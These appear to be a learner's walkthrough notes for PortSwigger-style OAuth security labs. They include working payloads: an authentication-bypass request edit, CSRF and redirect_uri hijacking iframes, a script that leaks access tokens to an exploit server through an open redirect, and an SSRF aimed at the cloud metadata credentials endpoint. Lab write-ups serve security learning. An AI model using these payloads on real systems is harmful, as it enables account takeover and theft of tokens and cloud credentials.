## LAB payloads

#### Authentication bypass via OAuth implicit flow
- complete the OAuth login process
- study the requests and responses that make up the OAuth flow. This starts from the authorization request **GET 
  /auth?client_id=[...]**
- notice **POST /authenticate**
- Send the **POST /authenticate** request to Burp Repeater. In Repeater, change the email address to 
  **carlos@carlos-montoya.net** and send the request. Observe that you do not encounter an error.
- request in original browser session

#### Forced OAuth profile linking
- study flow and look at link with code that is sent to redirect url without csrf protection
- intercept request with code then drop it
- hint - create iframe with url needed to be sent to admin

#### OAuth account hijacking via redirect_uri
- look at the flow. it is implicit with code
```
<iframe src="https://oauth-...oauth-server.net/auth?
client_id=y72q00fmhz78g7a2hge90&redirect_uri=https://exploit-...exploit-server.
net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe> --> oauth-callback - that part of url 
might lead to multiple requests with codes
```
or
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
- when obtain code use it in **GET /oauth-callback?code=...**
- paste code and then request in browser in original session

#### Stealing OAuth access tokens via an open redirect
- notice that for
```
GET /auth?client_id=[...]
```
- find in the response 
```
Redirecting to https://...web-security-academy.
net/oauth-callback#access_token=dKzqIuDVgEcjU7xGYOZRqufe1PRCmPsLiHogTo05MvE&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email
```
- here you may find # inside url
- look at next post func it may redirect to external resource
- if you change redirect url and view response:
```
Redirecting to https://...web-security-academy.net/post/next?
path=https%3A%2F%2Fexploit-...exploit-server.net%2Fexploit#access_token=ydIftLLym7h4pVYRHEvKqy_VbSIwKV3M-qZLTOJ4bd0
&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```
- so the payload should be like this:
```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-...oauth-server.net/auth?
        client_id=yoqlknawak27al9deu1yy&redirect_uri=https://...web-security-academy.net/oauth-callback/../post/next?
        path=https://exploit-...exploit-server.net/exploit&response_type=token&nonce=1192062328&scope=openid%20profile
    %20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
- find token in exploit server logs and add it to **GET /me**

#### SSRF via OpenID dynamic client registration
- according to theory - visit **https://oauth-...oauth-server.net/.well-known/openid-configuration**
- study the config
```
https://oauth-...oauth-server.net/jwks --> find jwt keys
"registration_endpoint": "https://oauth-...oauth-server.net/reg" --> register your web app
```
- in HTTP history find request:
```
https://oauth-...oauth-server.net/client/client-id/logo
```
- register web app with "logo_uri":"http://COLLAB", in response find client_id
- visit:
```
https://oauth-...oauth-server.net/client/COLLAB-client-id/logo
```
- find that collaborator received request
- change logo_uri to http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/